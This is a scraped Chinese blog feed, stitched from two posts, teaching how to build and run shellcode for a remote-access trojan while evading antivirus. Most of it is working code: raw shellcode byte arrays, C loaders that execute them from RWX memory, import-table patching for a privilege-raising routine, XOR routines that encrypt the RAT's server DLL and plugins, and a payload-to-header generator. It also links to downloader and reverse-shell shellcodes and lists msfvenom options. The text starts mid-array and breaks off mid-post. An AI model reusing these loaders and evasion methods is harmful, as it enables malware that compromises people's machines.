0x00,0x00, 0x00, 0x66, 0x89, 0x8C, 0x24, 0xCC, 0x00, 0x00, 0x00, 0x66, 0x89,0x9C, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x66, 0xC7, 0x84, 0x24, 0xDA, 0x00,0x00, 0x00, 0x07, 0x00, 0x66, 0x89, 0x8C, 0x24, 0xDC, 0x00, 0x00, 0x00,0x66, 0x89, 0xB4, 0x24, 0xDE, 0x00, 0x00, 0x00, 0x66, 0x89, 0x8C, 0x24,0xE4, 0x00, 0x00, 0x00, 0x66, 0x89, 0x8C, 0x24, 0xE8, 0x00, 0x00, 0x00,0x66, 0x89, 0xB4, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x66, 0x89, 0xBC, 0x24,0xF4, 0x00, 0x00, 0x00, 0x66, 0x89, 0x8C, 0x24, 0xF6, 0x00, 0x00, 0x00,0x66, 0x89, 0x8C, 0x24, 0xFE, 0x00, 0x00, 0x00, 0x66, 0x89, 0xB4, 0x24,0x04, 0x01, 0x00, 0x00, 0x76, 0x2E, 0x8B, 0x8C, 0x24, 0x0C, 0x01, 0x00,0x00, 0x81, 0xE2, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0xF2, 0x66, 0x3D, 0x7E,0x00, 0x75, 0x02, 0x33, 0xC0, 0x8A, 0x19, 0x8B, 0xD0, 0x81, 0xE2, 0xFF,0xFF, 0x00, 0x00, 0x8A, 0x54, 0x54, 0x0C, 0x32, 0xDA, 0x40, 0x88, 0x19,0x41, 0x4E, 0x75, 0xE1, 0x5F, 0x5E, 0x5B, 0x81, 0xC4, 0xFC, 0x00, 0x00,0x00, 0xC3};int main(int argc, char* argv[]){char bufferEnc[0x32]={"test111111\0"};typedef void(cdecl*fun1)(LPSTR szData, WORD Size);fun1 Myfun=(fun1)&amp;shellcodeBuffer;Myfun((char *)bufferEnc,0xA);getchar();return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RAT中shellcode抽取解决输入表重定位问题（二）"><a href="#RAT中shellcode抽取解决输入表重定位问题（二）" class="headerlink" title="RAT中shellcode抽取解决输入表重定位问题（二）"></a>RAT中shellcode抽取解决输入表重定位问题（二）</h2><p>被杀函数：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652164433061/3eb6ad350fb846ed87f1225a5b304b82.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable){HANDLE hToken;TOKEN_PRIVILEGES TokenPrivileges;if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &amp;hToken))return FALSE;TokenPrivileges.PrivilegeCount = 1;TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;LookupPrivilegeValue(NULL, lpPrivilegeName, &amp;TokenPrivileges.Privileges[0].Luid);AdjustTokenPrivileges(hToken, FALSE, &amp;TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);if (GetLastError() != ERROR_SUCCESS){CloseHandle(hToken);return FALSE;}CloseHandle(hToken);return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反汇编代码：</p><pre class="line-numbers language-none"><code class="language-none">00401000  /$  83EC 14       sub esp,0x1400401003  |.  8D4424 00     lea eax,dword ptr ss:[esp]00401007  |.  50            push eax                                 ; /phToken = 00390B5800401008  |.  6A 28         push 0x28                                ; |DesiredAccess = TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES0040100A  |.  FF15 10604000 call dword ptr ds:[&lt;&amp;KERNEL32.GetCurrent&gt;; |[GetCurrentProcess00401010  |.  50            push eax                                 ; |hProcess = 00390B5800401011  |.  FF15 00604000 call dword ptr ds:[&lt;&amp;ADVAPI32.OpenProces&gt;; \OpenProcessToken   ---需要修复00401017  |.  85C0          test eax,eax00401019  |.  75 04         jnz short ShellCod.0040101F0040101B  |.  83C4 14       add esp,0x140040101E  |.  C3            retn0040101F  |&gt;  8B4C24 1C     mov ecx,dword ptr ss:[esp+0x1C]00401023  |.  8B4424 18     mov eax,dword ptr ss:[esp+0x18]00401027  |.  F7D9          neg ecx                                  ;  ShellCod.0040747800401029  |.  8D5424 08     lea edx,dword ptr ss:[esp+0x8]0040102D  |.  C74424 04 010&gt;mov dword ptr ss:[esp+0x4],0x100401035  |.  1BC9          sbb ecx,ecx                              ;  ShellCod.0040747800401037  |.  52            push edx                                 ; /pLocalId = 0000000300401038  |.  83E1 02       and ecx,0x2                              ; |0040103B  |.  50            push eax                                 ; |Privilege = "?9"0040103C  |.  6A 00         push 0x0                                 ; |SystemName = NULL0040103E  |.  894C24 1C     mov dword ptr ss:[esp+0x1C],ecx          ; |ShellCod.0040747800401042  |.  FF15 04604000 call dword ptr ds:[&lt;&amp;ADVAPI32.LookupPriv&gt;; \LookupPrivilegeValueA00401048  |.  8B5424 00     mov edx,dword ptr ss:[esp]               ;  ShellCod.004073F40040104C  |.  6A 00         push 0x0                                 ; /pRetLen = NULL0040104E  |.  6A 00         push 0x0                                 ; |pPrevState = NULL00401050  |.  8D4C24 0C     lea ecx,dword ptr ss:[esp+0xC]           ; |00401054  |.  6A 10         push 0x10                                ; |PrevStateSize = 10 (16.)00401056  |.  51            push ecx                                 ; |pNewState = ShellCod.0040747800401057  |.  6A 00         push 0x0                                 ; |DisableAllPrivileges = FALSE00401059  |.  52            push edx                                 ; |hToken = 000000030040105A  |.  FF15 08604000 call dword ptr ds:[&lt;&amp;ADVAPI32.AdjustToke&gt;; \AdjustTokenPrivileges --需要修复00401060  |.  FF15 14604000 call dword ptr ds:[&lt;&amp;KERNEL32.GetLastErr&gt;; [GetLastError          --需要修复00401066  |.  85C0          test eax,eax00401068  |.  74 11         je short ShellCod.0040107B0040106A  |.  8B4424 00     mov eax,dword ptr ss:[esp]               ;  ShellCod.004073F40040106E  |.  50            push eax                                 ; /hObject = 00390B580040106F  |.  FF15 18604000 call dword ptr ds:[&lt;&amp;KERNEL32.CloseHandl&gt;; \CloseHandle          ---需要修复00401075  |.  33C0          xor eax,eax00401077  |.  83C4 14       add esp,0x140040107A  |.  C3            retn0040107B  |&gt;  8B4C24 00     mov ecx,dword ptr ss:[esp]               ;  ShellCod.004073F40040107F  |.  51            push ecx                                 ; /hObject = 0040747800401080  |.  FF15 18604000 call dword ptr ds:[&lt;&amp;KERNEL32.CloseHandl&gt;; \CloseHandle00401086  |.  B8 01000000   mov eax,0x10040108B  |.  83C4 14       add esp,0x140040108E  \.  C3            retn修复IAT的部分：unsigned char Shellcode_EnablePriv[143] ={0x83, 0xEC, 0x14, 0x8D, 0x44, 0x24, 0x00, 0x50, 0x6A, 0x28, 0xFF, 0x15,0x10, 0x60, 0x40, 0x00, 0x50, 0xFF, 0x15, 0x00, 0x60, 0x40, 0x00, 0x85,0xC0, 0x75, 0x04, 0x83, 0xC4, 0x14, 0xC3, 0x8B, 0x4C, 0x24, 0x1C, 0x8B,0x44, 0x24, 0x18, 0xF7, 0xD9, 0x8D, 0x54, 0x24, 0x08, 0xC7, 0x44, 0x24,0x04, 0x01, 0x00, 0x00, 0x00, 0x1B, 0xC9, 0x52, 0x83, 0xE1, 0x02, 0x50,0x6A, 0x00, 0x89, 0x4C, 0x24, 0x1C, 0xFF, 0x15, 0x04, 0x60, 0x40, 0x00,0x8B, 0x54, 0x24, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x8D, 0x4C, 0x24, 0x0C,0x6A, 0x10, 0x51, 0x6A, 0x00, 0x52, 0xFF, 0x15, 0x08, 0x60, 0x40, 0x00,0xFF, 0x15, 0x14, 0x60, 0x40, 0x00, 0x85, 0xC0, 0x74, 0x11, 0x8B, 0x44,0x24, 0x00, 0x50, 0xFF, 0x15, 0x18, 0x60, 0x40, 0x00, 0x33, 0xC0, 0x83,0xC4, 0x14, 0xC3, 0x8B, 0x4C, 0x24, 0x00, 0x51, 0xFF, 0x15, 0x18, 0x60,0x40, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x83, 0xC4, 0x14, 0xC3};unsigned char IAT_Table[0x1024]={0};int main(int argc, char* argv[]){//EnablePrivilege(SE_DEBUG_NAME, TRUE);char * CallpAddr=new char[1024];memcpy((char *)CallpAddr,(char*)Shellcode_EnablePriv,143);typedef BOOL (WINAPI * funOpenProcessToken)(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle    );funOpenProcessToken MyOpenProcessToken=(funOpenProcessToken)GetProcAddress(LoadLibraryA("advapi32.dll"),"OpenProcessToken");if (MyOpenProcessToken!=NULL){*(DWORD *)((char *)CallpAddr+0x13)=(DWORD)&amp;IAT_Table;*(DWORD *)((char *)IAT_Table)=(DWORD)MyOpenProcessToken;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RAT高级shellcode获取途径（三）"><a href="#RAT高级shellcode获取途径（三）" class="headerlink" title="RAT高级shellcode获取途径（三）"></a>RAT高级shellcode获取途径（三）</h2><p>网络上有许多已经编写好的shellcode资源公开分享，由于shellcode的本质是一段机器码，在不同的硬件设备上可能有诸多区别，在使用时一定要注意平台是否通用。下面是两个可以学习的网站</p><p>红队-下载器</p><p><a href="https://www.exploit-db.com/shellcodes/50710">https://www.exploit-db.com/shellcodes/50710</a></p><p>红队-RAT 反弹shellcode</p><p><a href="https://www.exploit-db.com/shellcodes/50384">https://www.exploit-db.com/shellcodes/50384</a></p><p>win x64反弹shellcode</p><p><a href="https://www.exploit-db.com/shellcodes/50291">https://www.exploit-db.com/shellcodes/50291</a></p><p>//////////////////////////////////////////////////////////////////////////////////////////////////////////////</p><p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652164433061/e600e4c304484e52bd4d50e1548b6dbb.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">sub esp, 8xor eax, eaxcdqxchg edx, ecxStackWalk :mov ebx, [esp + ecx]; Walking down the stack to find a possible kernel32 pointermov edx, ebxshr ebx, 28; Shift right 28 to get the last digit in the address, (looking for 7)add ecx, 4cmp ebx, 7; is it 7 ?jne StackWalkjmp short checkingcheckAddress :push ebpmov ebp, espjmp rev1; jmp down to rev1 and up again to avoid null bytes and get the address of next instruciton.reverse:pop eaxjmp eaxrev1:call reverseadd eax, 0x1epush eaxxor edi, edipush dword ptr FS : [edi]; Push FS[0] SEHmov dword ptr fs : [edi] , esp; set up or SEH stackmov eax, dword ptr ss : [ebp + 8]        xchg eax, esi; We want to call [esi] instead of [eax] next to avoid null bytesmov eax, dword ptr ds : [esi] xor eax, eaxjmp short cleansehxor eax, eaxinc eaxmov esp, dword ptr fs : [edi]mov esp, dword ptr ss : [esp]cleanseh :pop dword ptr fs : [edi]add esp, 4pop ebpretchecking:mov [ebp-0xc], ecxpush edx; Push the address we want to check if it's valid or notcall checkAddress; call the custom SEH functiontest eax, eax; is it valid ? 0 ?je validmov ecx, [ebp-0xc]jmp short StackWalkvalid :mov ecx, [ebp-0xc]mov ax, 0xffff; We want to subtract 0x10000 from the address we found 0xffff + 1 = 0x10000inc eaxfindMZ:sub edx, eax; Sub 0x10000 from the possible addressmov dx, axmov ax, [edx]cmp ax, 0x5a4d; check for MZ to make sure it's a DLL file.jne findMZ; If not, subtract one more 0x10000 to get a different section.xchg edx, ebxmov edi, [ebx + 0x3c]; Walk the PE fileadd edi, ebxmov edi, [edi + 0x78]add edi, ebxmov edi, [edi + 0xc]add edi, ebxadd edi, 4xor eax, eaxpush eaxpush 0x6c6c642e; string .dllpush 0x32334c45; string EL32= EL32.dll short for KERNEL32.dllmov esi, espcheckKernel :mov edx, ecxmov cl, 8; Compare string to KERNEL32.dll EDI ==&gt; KERNEl32.dllcldrepe cmpsbtest ecx, ecxje foundKernel; if equal, jmp to foundKernelmov ecx, edxjmp StackWalkfoundKernel :; Kernel32 base address should be in EBX if you reach this line.#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;unsigned char code[] = "\x83\xEC\x08\x31\xC0\x99\x87\xCA\x8B\x1C\x0C\x89\xDA\xC1\xEB\x1C\x83\xC1\x04\x83\xFB\x07\x75\xF0\xEB\x34\x55\x89\xE5\xEB\x03\x58\xFF\xE0\xE8\xF8\xFF\xFF\xFF\x83\xC0\x1E\x50\x31\xFF\x64\xFF\x37\x64\x89\x27\x8B\x45\x08\x96\x8B\x06\x31\xC0\xEB\x09\x31\xC0\x40\x64\x8B\x27\x8B\x24\x24\x64\x8F\x07\x83\xC4\x04\x5D\xC3\x89\x4D\xF4\x52\xE8\xC3\xFF\xFF\xFF\x85\xC0\x74\x05\x8B\x4D\xF4\xEB\xA8\x8B\x4D\xF4\x66\xB8\xFF\xFF\x40\x29\xC2\x66\x89\xC2\x66\x8B\x02\x66\x3D\x4D\x5A\x75\xF2\x87\xDA\x8B\x7B\x3C\x01\xDF\x8B\x7F\x78\x01\xDF\x8B\x7F\x0C\x01\xDF\x83\xC7\x04\x31\xC0\x50\x68\x2E\x64\x6C\x6C\x68\x45\x4C\x33\x32\x89\xE6\x89\xCA\xB1\x08\xFC\xF3\xA6\x85\xC9\x74\x07\x89\xD1\xE9\x5D\xFF\xFF\xFF";int main(){void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);memcpy(exec, code, sizeof(code));((void(*)())exec)();return 0;}  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RAT高级shellcode生成器原理（四）"><a href="#RAT高级shellcode生成器原理（四）" class="headerlink" title="RAT高级shellcode生成器原理（四）"></a>RAT高级shellcode生成器原理（四）</h2><pre class="line-numbers language-none"><code class="language-none">shelle生成器加密部分：void EncrypMain(char *Buff, int Size, char *AddTable) //加密/解密服务端文件(Server.dll){for (int i=0, j=0; i&lt;Size; i++){Buff[i] ^= AddTable[j++] % 1753 + 79;if (i % 5 == 0)j = 0;}}void EncryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //加密插件{unsigned long i;unsigned char p;p = (unsigned char ) key % 1451 + 61;for(i = 0; i &lt; nLen; i++){*szRec -= p;*szRec++ ^= p;}}void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key) //解密插件{unsigned long i;unsigned char p;p = (unsigned char ) key % 1451 + 61;for(i = 0; i &lt; nLen; i++){*szRec ^= p;*szRec += p;szRec++;}}shellcode生成器转换部分：char OutData1[] = "/*\r\n DriverCode32 By Anonymity\r\n My QQ ????????\r\n"" 直接include此单元，使用 DriverCode32SaveFile(\"xxx.xxx\");即可生成文件\r\n*/\r\n\r\n";char OutData2[] = "#ifndef _HEX_DRIVERCODE32_\r\n#define _HEX_DRIVERCODE32_\r\n#include &lt;windows.h&gt;\r\n\r\n";char OutData3[64] = {0};sprintf(OutData3, "const g_DriverCode32FileSize = %d;\r\n", dwSysSize);char OutData4[] = "unsigned char g_DriverCode32FileBuff[] = {\r\n";char OutData5[] = "};\r\n\r\n";char OutData6[] = "/*\r\nbool DriverCode32SaveFile(char *FileName)\r\n{\r\n\tbool Result = false;""\r\n\tHANDLE hFile;\r\n\tDWORD dwBytesWritten;\r\n""\thFile = CreateFile(FileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);\r\n""\tif (hFile == INVALID_HANDLE_VALUE) Result = false;\r\n""\tif (WriteFile(hFile, g_DriverCode32FileBuff, g_DriverCode32FileSize, &amp;dwBytesWritten, NULL)) Result = true;\r\n""\tCloseHandle(hFile);\r\n\treturn Result;\r\n}\r\n*/\r\n\r\n#endif\r\n";hOutFile = CreateFile("DriverCode32.h", GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, NULL);if (hOutFile == INVALID_HANDLE_VALUE){VirtualFree(pOutBuff, 0, MEM_RELEASE);return FALSE;}if (!WriteFile(hOutFile, OutData1, strlen(OutData1), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData2, strlen(OutData2), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData3, strlen(OutData3), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData4, strlen(OutData4), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, pOutBuff, (dwSysSize*5-1)+((dwSysSize+32-1)/32*2), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData5, strlen(OutData5), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}if (!WriteFile(hOutFile, OutData6, strlen(OutData6), &amp;BytesWritten, NULL)){VirtualFree(pOutBuff, 0, MEM_RELEASE);CloseHandle(hOutFile);return FALSE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.13-kai-fa-gao-ji-ban-shellcode-jia-zai-qi-shang/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.13-kai-fa-gao-ji-ban-shellcode-jia-zai-qi-shang/</url>
      
        <content type="html"><![CDATA[<h2 id="shellcode-高级基础原理（一）"><a href="#shellcode-高级基础原理（一）" class="headerlink" title="shellcode 高级基础原理（一）"></a>shellcode 高级基础原理（一）</h2><ul><li>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode <strong>机器码</strong> ，让电脑可以执行攻击者的任意指令。</li><li>shellcode与exploit：</li></ul><blockquote><p>exploit 一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性输入。expliot的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode。与shellcode具有一定的通用性不同，exploit 往往是针对特定漏洞而言的。</p></blockquote><blockquote><p>exploit 关心的是怎样淹没返回地址，获得进程控制权，把 EIP 传递给 shellcode 让其得到执行并发挥作用，而不关心 shellcode 到底是弹出一个消息框的恶作剧，还是用于格式化对方硬盘的穷凶极恶的代码。</p></blockquote><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652062405056/7c792070d9994601be2a0a36818ecda1.png" alt="image.png"></p><p>1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用环境<br>Kali 2.0</p><p>msfvenom</p><p>2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Msfvenom参数说明<br>msfvenom –h &nbsp;&nbsp;&nbsp;查看帮助</p><pre class="line-numbers language-none"><code class="language-none">Options:&nbsp;&nbsp;&nbsp; &nbsp;-p, --payload&nbsp;&nbsp;&nbsp; &nbsp;&lt;payload&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用'-'或者stdin指定&nbsp;&nbsp;&nbsp; &nbsp;-l, --list&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;[module_type]&nbsp;&nbsp; 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all&nbsp;&nbsp;&nbsp; &nbsp;-n, --nopsled&nbsp;&nbsp;&nbsp; &nbsp;&lt;length&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 为payload预先指定一个NOP滑动长度&nbsp;&nbsp;&nbsp; &nbsp;-f, --format&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&lt;format&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)&nbsp;&nbsp;&nbsp; &nbsp;-e, --encoder&nbsp;&nbsp;&nbsp; [encoder]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定需要使用的encoder（编码器）&nbsp;&nbsp;&nbsp; &nbsp;-a, --arch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&lt;architecture&gt;&nbsp; 指定payload的目标架构&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;--platform&nbsp;&nbsp; &nbsp;&lt;platform&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定payload的目标平台&nbsp;&nbsp;&nbsp; &nbsp;-s, --space&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&lt;length&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设定有效攻击荷载的最大长度&nbsp;&nbsp;&nbsp; &nbsp;-b, --bad-chars&nbsp; &nbsp;&lt;list&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 设定规避字符集，比如: '\x00\xff'&nbsp;&nbsp;&nbsp; &nbsp;-i, --iterations &lt;count&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;指定payload的编码次数&nbsp;&nbsp;&nbsp; &nbsp;-c, --add-code&nbsp;&nbsp; &nbsp;&lt;path&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定一个附加的win32 shellcode文件&nbsp;&nbsp;&nbsp; &nbsp;-x, --template&nbsp;&nbsp; &nbsp;&lt;path&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定一个自定义的可执行文件作为模板&nbsp;&nbsp;&nbsp; &nbsp;-k, --keep&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;保护模板程序的动作，注入的payload作为一个新的进程运行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;--payload-options&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 列举payload的标准选项&nbsp;&nbsp;&nbsp; &nbsp;-o, --out&nbsp;&nbsp; &lt;path&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 保存payload&nbsp;&nbsp;&nbsp; &nbsp;-v, --var-name &lt;name&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;指定一个自定义的变量，以确定输出格式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;--shellest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 最小化生成payload&nbsp;&nbsp;&nbsp; &nbsp;-h, --help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;查看帮助选项&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;--help-formats&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 查看msf支持的输出格式列表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>msfvenom –help-formats&nbsp;&nbsp;&nbsp;&nbsp; 查看有哪些格式输出</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1652062405056/a7f0f6c2369c44efb9005834400d3779.png" alt="image.png"></p><h2 id="shellcode-高级基础原理（二）"><a href="#shellcode-高级基础原理（二）" class="headerlink" title="shellcode 高级基础原理（二）"></a>shellcode 高级基础原理（二）</h2><p><strong>shellcode调试基础：如何把shellcode放置到内存，让程序跳转到该段内存执行？</strong></p><ol><li><strong>指向函数的指针</strong></li></ol><ul><li>evil数组中存储的是一段shellcode，该shellcode 功能属于验证类，其在windows_xp sp2系统环境下执行后，可以弹出计算器</li></ul><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;char evil[] = 